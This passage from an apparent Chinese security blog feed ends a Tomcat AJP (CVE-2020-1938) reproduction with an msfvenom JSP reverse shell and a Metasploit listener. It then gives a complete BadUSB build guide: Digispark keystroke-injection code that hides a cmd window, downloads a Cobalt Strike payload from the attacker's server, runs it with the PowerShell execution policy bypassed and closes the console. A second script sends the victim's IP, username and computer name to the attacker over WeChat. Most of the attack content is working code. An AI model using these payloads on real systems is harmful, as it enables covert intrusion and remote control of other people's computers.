class="hljs-number">192.168.129.131</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>[![image-20220814222719820](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220814222719820.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220814222719820.png)</p><p>image-20220814222719820</p><p>ajp13端口开放，tomcat版本9.0.30，满足漏洞利用条件</p><h5 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h5><p>使用exp中的文件读取脚本，尝试读取web.xml（使用python2环境）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> Tomcat-ROOT 路径下文件读取(CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">1938</span>).py -f WEB-INF/web.xml <span class="hljs-number">192.168.129.131</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220814230646159](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220814230646159.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220814230646159.png)</p><p>image-20220814230646159</p><p>读取成功</p><p>进入kali，生成jsp木马</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.129.130 <span class="hljs-attribute">LPORT</span>=6666 -f<span class="hljs-built_in"> raw </span>&gt; shell.jsp <br><br>SHELL<br></code></pre></td></tr></table></figure><p>[![image-20220815004053854](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220815004053854.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220815004053854.png)</p><p>image-20220815004053854</p><p>设置监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole <br><br>use exploit/multi/handler  <span class="hljs-comment">#使用监听模块</span><br><br><span class="hljs-built_in">set</span> payload java/jsp_shell_reverse_tcp  <span class="hljs-comment">#设置反向监听</span><br><br><span class="hljs-built_in">set</span> lhost 192.168.129.130  <span class="hljs-comment">#设置监听ip</span><br><br><span class="hljs-built_in">set</span> lport 6666  <span class="hljs-comment">#设置监听端口</span><br><br>options  <span class="hljs-comment">#查看设置是否正确</span><br><br>run <span class="hljs-comment">#开启监听</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>[![image-20220815010558155](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220815010558155.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220815010558155.png)</p><p>image-20220815010558155</p><p>进入靶机，上传木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker ps <span class="hljs-comment">#查看容器ID </span><br><br>docker <span class="hljs-built_in">exec</span> -it 容器<span class="hljs-built_in">id</span> bash <span class="hljs-comment">#进入docker容器</span><br><br><span class="hljs-built_in">cd</span> /usr/local/tomcat/webapps/ROOT <span class="hljs-comment">#进入ROOT目录</span><br><br>SHELL<br></code></pre></td></tr></table></figure><p>假设我们通过文件上传漏洞上传了jsp脚本的txt文件，来尝试文件包含进行远程代码执行（RCE）（创建一个含jsp脚本的txt文件）</p><p>把刚才从kali中生成的shell.jsp重命名为shell.txt,并想办法上传到靶机中（模拟文件上传漏洞）</p><p>[![image-20220815011914192](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220815011914192.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220815011914192.png)</p><p>image-20220815011914192</p><p>使用exp中的文件包含脚本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python2</span> CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">1938</span>\Tomcat-ROOT路径下文件包含(CVE-<span class="hljs-number">2020</span>-<span class="hljs-number">1938</span>).py -f /shell.txt <span class="hljs-number">192.168.129.131</span><br><br><span class="hljs-attribute">SHELL</span><br></code></pre></td></tr></table></figure><p>[![image-20220815010815911](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220815010815911.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220815010815911.png)</p><p>image-20220815010815911</p><p>kali成功上线</p><p>[![image-20220815005523753](D:\blog2\source_posts\Aapache Tomcat AJP 任意文件读取包含漏洞（CVE-2020-1938）.assets\image-20220815005523753.png)](<a href="https://xiaojun88.github.io/2022/08/14/CVE-2020-1938%EF%BC%88Aapache">https://xiaojun88.github.io/2022/08/14/CVE-2020-1938（Aapache</a> Tomcat AJP 任意文件读取包含漏洞）&#x2F;image-20220815005523753.png)</p><p>image-20220815005523753</p><h5 id="4-关闭环境"><a href="#4-关闭环境" class="headerlink" title="4.关闭环境"></a>4.关闭环境</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">docker-compose down <span class="hljs-attr">--rmi</span> <span class="hljs-attribute">all</span> -v #关闭并删除环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>badsub制作</title>
    <link href="/2023/08/13/badsub%E5%88%B6%E4%BD%9C/"/>
    <url>/2023/08/13/badsub%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>（仅作为技术分享，请勿用于非法行为！！！）</p><h3 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h3><p>利用HID(Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击，将USB设备伪装使电脑识别为键盘，再利用USB设备中的微控制芯片，向主机发送命令，从而实现完全控制主机。现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。</p><h3 id="准备阶段："><a href="#准备阶段：" class="headerlink" title="准备阶段："></a>准备阶段：</h3><p>硬件材料：Digispark （Attiny85）开发板</p><p>云服务器一台（centos）</p><p>CobaltStrike4.0</p><p>Invoke-Obfuscation免杀脚本：<a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><p>Arduino编程软件：<a href="https://www.arduino.cc/en/donate/">https://www.arduino.cc/en/donate/</a></p><p>驱动：<a href="https://github.com/digistump/DigistumpArduino/blob/master/tools/micronucleus-2.0a4-win.zip">https://github.com/digistump/DigistumpArduino/blob/master/tools/micronucleus-2.0a4-win.zip</a></p><h3 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h3><h5 id="1-部署cs4服务端"><a href="#1-部署cs4服务端" class="headerlink" title="1.部署cs4服务端"></a>1.部署cs4服务端</h5><p>上传cs4到云服务器(centos)，进入cs4目录，赋予teamserver运行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 ./teamserver<br><br>SHELL<br></code></pre></td></tr></table></figure><h5 id="2-下载screen"><a href="#2-下载screen" class="headerlink" title="2.下载screen"></a>2.下载screen</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">yum install <span class="hljs-keyword">screen</span> -y<br><br><span class="hljs-built_in">SHELL</span><br></code></pre></td></tr></table></figure><p>在linux远程会话的时候，使用screen可以很方便地进行会话管理而不需要担心<a href="https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020">ssh</a>断开后程序停止运行。</p><p>常用命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">screen</span><span class="hljs-comment">#新建一个screen会话</span><br><span class="hljs-keyword">screen </span>vi test.<span class="hljs-keyword">sh </span>  <span class="hljs-comment">#新建一个运行vi test.sh的screen会话，退出vi会自动退出该会话</span><br><span class="hljs-keyword">screen </span>-S &lt;<span class="hljs-keyword">screen_name&gt;</span><span class="hljs-comment">#新建一个名为&lt;screen_name&gt;的screen会话</span><br><span class="hljs-keyword">screen </span>-ls<span class="hljs-comment">#列出当前所有screen会话</span><br><span class="hljs-keyword">screen </span>-r &lt;<span class="hljs-keyword">screen_pid&gt; </span><span class="hljs-comment">#恢复id为&lt;screen_pid&gt;的会话</span><br><span class="hljs-keyword">screen </span>-r &lt;<span class="hljs-keyword">screen_name&gt; </span><span class="hljs-comment">#恢复名称为&lt;screen_name&gt;的会话</span><br><span class="hljs-keyword">screen </span>-d &lt;<span class="hljs-keyword">screen_name&gt; </span><span class="hljs-comment">#断开名称为&lt;screen_name&gt;的会话，但是会话的任务会继续执行</span><br><span class="hljs-keyword">screen </span>-d    <span class="hljs-comment">#断开当前的会话，但是会话的任务会继续执行</span><br><span class="hljs-keyword">screen </span>-D -r &lt;<span class="hljs-keyword">screen_pid&gt; </span><span class="hljs-comment">#用户断线后重连踢掉attached的screen会话</span><br>exit     <span class="hljs-comment">#在screen内输入exit会退出并关闭会话</span><br><span class="hljs-keyword">screen </span>-S &lt;<span class="hljs-keyword">screen_name&gt; </span>-X quit <span class="hljs-comment">#杀死名称为&lt;screen_name&gt;的会话</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure><h5 id="3-运行cs"><a href="#3-运行cs" class="headerlink" title="3.运行cs"></a>3.运行cs</h5><p>创建一个screen窗口，用于运行cs服务端：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">screen</span> -S cs4<span class="hljs-number">.0</span>  <span class="hljs-meta">#新建名为cs4的窗口</span><br>cd cs4目录  <br>vim teamserver <span class="hljs-meta">#修改cs4运行端口</span><br><br><span class="hljs-built_in">SHELL</span><br></code></pre></td></tr></table></figure><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813182311518.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813182311518.png" alt="image-20220813182311518"></a></p><p>image-20220813182311518</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./teamserver ip 密码  <span class="hljs-comment">#运行cs4服务端</span><br>ctrl+a后，按d <span class="hljs-comment">#返回主窗口</span><br><br>BASH<br></code></pre></td></tr></table></figure><h5 id="4-设置监听"><a href="#4-设置监听" class="headerlink" title="4.设置监听"></a>4.设置监听</h5><p>连接上cs客户端，并添加一个名为badusb的监听：</p><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813182941849.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813182941849.png" alt="image-20220813182941849"></a></p><p>image-20220813182941849</p><h5 id="5-生成免杀马"><a href="#5-生成免杀马" class="headerlink" title="5.生成免杀马"></a>5.生成免杀马</h5><p>菜单栏 攻击–&gt;生成后门–&gt;Payload Generator</p><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813215724225.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813215724225.png" alt="image-20220813215724225"></a></p><p>image-20220813215724225</p><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813215826412.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813215826412.png" alt="image-20220813215826412"></a></p><p>image-20220813215826412</p><p>可以使用Invoke-Obfuscation进行免杀，这里不再演示</p><p>在云服务器上安装httpd服务，并将木马上传到默认的网站根目录：&#x2F;var&#x2F;www&#x2F;html&#x2F;下，网页访问试试能不能下载到，之后会通过badusb的脚本来访问这个链接：</p><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813215538481.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813215538481.png" alt="image-20220813215538481"></a></p><p>image-20220813215538481</p><p>如若访问不成功，检查服务器云防护端口是否开放</p><h5 id="6-软件安装"><a href="#6-软件安装" class="headerlink" title="6.软件安装"></a>6.软件安装</h5><p>烧录前需要准备两个软件：Arduino软件、Digispark （Attiny85）开发板驱动。</p><p>Arduino可以去官网免费下载：材料准备阶段查看</p><p>驱动下载：材料准备阶段查看</p><p>将驱动解压，选择文件夹中的DPinst.exe或DPinst64.exe双击运行，这取决于你自己的机器是32位还是64位：</p><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813221012491.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813221012491.png" alt="image-20220813221012491"></a></p><p>image-20220813221012491</p><h5 id="7-制作badusb烧录"><a href="#7-制作badusb烧录" class="headerlink" title="7.制作badusb烧录"></a>7.制作badusb烧录</h5><p>打开arduino，就可以设计badusb插入后要执行的程序了，这块在学习中能了解到，是一块很庞大的知识，利用好了能产生无限可能。想</p><p>想就相当于badusb插入靶机后，你就在靶机里获得了一个虚拟键盘和鼠标的权限，想开什么端口，反弹shell，或是关掉杀毒软件，防火</p><p>墙等等，都可以通过编程实现。</p><p>但这次我的目的只是制作一个能配合CS4上线的badusb玩具，所以仅限于反弹shell方面的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span></span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_ESC 41</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_BACKSPACE 42</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_TAB 43</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_PRT_SCR 70</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_DELETE 76</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_CAPS_LOCK 0x39</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span> </span>&#123;<br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>);<br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_R,MOD_GUI_LEFT); <span class="hljs-comment">//win+R</span><br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_CAPS_LOCK); <span class="hljs-comment">//大小写转换绕过中文输入法</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;CMD /t:01 /k @ECHO OFF &amp;&amp; MODE CON:cols=15 lines=1&quot;</span>); <span class="hljs-comment">//最小化cmd窗口</span><br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_ENTER); <span class="hljs-comment">//回车</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;mkdir C:\\test&quot;</span>); <span class="hljs-comment">//C盘创建一个test目录</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;powershell&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$clnt = new-object system.net.webclient;&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$url= &#x27;http://xxx.xxx.xxx.xxx/p64&#x27;;&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$file = &#x27;c:\\test\\b.ps1&#x27;;&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$clnt.downloadfile($url,$file)&quot;</span>); <span class="hljs-comment">//分段执行，绕过防火墙进程保护，从云端下载木马到本地C盘test目录，并命名为b.ps1</span><br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;powershell.exe -executionpolicy bypass -file c:\\test\\b.ps1&quot;</span>); <span class="hljs-comment">//本地权限绕过执行木马</span><br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_ENTER);<br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_R,MOD_GUI_LEFT); <span class="hljs-comment">//win+R</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;taskkill /t /im conhost.exe /f&quot;</span>); <span class="hljs-comment">//关闭cmd的宿主程序，即图形界面</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span> </span>&#123;<br>&#125;<br><br>REASONML<br></code></pre></td></tr></table></figure><p>编译没问题后，点击右箭头烧录，然后在60s内将U盘插入，等待提示烧录成功即可：</p><p><a href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813221722025.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813221722025.png" alt="image-20220813221722025"></a></p><p>image-20220813221722025</p><h5 id="8-CS4微信上线提示设置"><a href="#8-CS4微信上线提示设置" class="headerlink" title="8.CS4微信上线提示设置"></a>8.CS4微信上线提示设置</h5><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs llvm">访问Server酱https://sct.ftqq.com/<br><br>直接用微信扫码关注公众号就可以登陆，然后Server酱就会给你生成一个SendKey，用这个东西配合以下脚本：<br><br>\# 循环获取所有beacon<br>on beacon_initial &#123;<br><br><span class="hljs-keyword">sub</span> http_get &#123;<br>local(&#x27;$output&#x27;)<span class="hljs-comment">;</span><br>$url <span class="hljs-operator">=</span> [new java.net.URL: $<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>$stream <span class="hljs-operator">=</span> [$url openStream]<span class="hljs-comment">;</span><br>$handle <span class="hljs-operator">=</span> [SleepUtils getIOHandle: $stream<span class="hljs-punctuation">,</span> $<span class="hljs-keyword">null</span>]<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br><span class="hljs-title">@content</span> <span class="hljs-operator">=</span> readAll($handle)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>foreach $line (<span class="hljs-title">@content</span>) &#123;<br>$output .<span class="hljs-operator">=</span> $line . <span class="hljs-string">&quot;\r\n&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br>println($output)<span class="hljs-comment">;</span><br>&#125;<br>\# 获取ip、计算机名、登录账号<br>$externalIP <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;external&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br>$internalIP <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;internal&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br>$userName <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;user&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br>$computerName <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;computer&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>\# get一下Server酱的链接<br>$url <span class="hljs-operator">=</span> &#x27;https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text<span class="hljs-operator">=</span>CobaltStrike<span class="hljs-variable">%e4</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%e7</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%90</span><span class="hljs-variable">%e9</span><span class="hljs-variable">%86</span><span class="hljs-variable">%92</span>&amp;desp<span class="hljs-operator">=</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%86</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%81</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%86</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%bc</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%84</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%e8</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%e7</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%91</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%b5</span><span class="hljs-variable">%b0</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%86</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%82</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e5</span><span class="hljs-variable">%a4</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%91</span>ip:&#x27;.$externalIP.&#x27;<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e5</span><span class="hljs-variable">%86</span><span class="hljs-variable">%85</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%bd</span><span class="hljs-variable">%91</span>ip:&#x27;.$internalIP.&#x27;<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e7</span><span class="hljs-variable">%94</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>d:&#x27;.$userName.&#x27;<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e8</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%a1</span><span class="hljs-variable">%e7</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%97</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%e5</span><span class="hljs-variable">%90</span><span class="hljs-variable">%8</span>d:&#x27;.$computerName<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>http_get($url)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>&#125;<br><br>LLVM<br></code></pre></td></tr></table></figure><p>在以上代码填写好自己的SendKey之后，保存为weixinNotice.cna文件，上传到云服务器的CS4根目录，在CS4服务端开启的情况下（如果没开启自行开启后再下一步）使用下列命令，开启微信提醒脚本并在后台保持运行：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">screen -S cs4-notice<br>./agscript xxx<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.xxx</span> <span class="hljs-number">5044</span> 用户名 密码 weixinNotice<span class="hljs-selector-class">.cna</span><br>Ctrl+a，松开，再按d <span class="hljs-comment">//会话后台运行</span><br><br>STYLUS<br></code></pre></td></tr></table></figure><h5 id="8-实战"><a href="#8-实战" class="headerlink" title="8.实战"></a>8.实战</h5><p>将usb插入一个未关机的windows系统电脑，20秒后微信会收到cs上线提醒：</p><p><a 